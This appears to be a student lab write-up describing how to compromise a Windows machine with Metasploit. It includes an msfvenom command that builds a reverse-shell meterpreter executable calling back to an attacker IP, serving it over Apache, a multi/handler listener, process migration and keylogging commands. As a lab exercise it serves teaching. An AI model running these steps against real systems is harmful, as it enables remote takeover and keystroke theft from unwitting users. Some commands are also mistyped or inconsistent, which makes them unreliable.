# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands
## PROGRAM:

Find the attackers ip address using ifconfig


## OUTPUT:
![Screenshot 2025-04-21 101045](https://github.com/user-attachments/assets/19a1c0df-1f79-44de-a7f8-84c52698c143)

Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

![image](https://github.com/user-attachments/assets/0b4a8445-5db7-4b8a-8fe5-9b9887071562)

copy the fun.exe into the apache /var/www/html folder


![image](https://github.com/user-attachments/assets/02e537dd-d645-4175-8a1d-a6c8be06098e)

Start apache server sudo systemctl apache2 start


![image](https://github.com/user-attachments/assets/f6671861-83b5-47f7-9883-85917c950bb2)


Check the status of apache2

![image](https://github.com/user-attachments/assets/4e4385c2-6741-4e47-9e10-037590ebb90e)

Invoke msfconsole:

## OUTPUT:
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit

![image](https://github.com/user-attachments/assets/2dbf77b9-5e0a-45b3-9c1c-28f544a0ca5d)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.

![image](https://github.com/user-attachments/assets/99931d3f-09a9-4c1f-9c87-30927bc977ff)

Bypass any warning boxes, double-click the file, and allow it to run.

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![image](https://github.com/user-attachments/assets/b5f1a08c-7335-469b-93eb-28591f603680)

keyscan_dump Shows the keystrokes captured so far
![image](https://github.com/user-attachments/assets/06c940b6-1f40-4316-a8fe-472d8dde2951)












## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
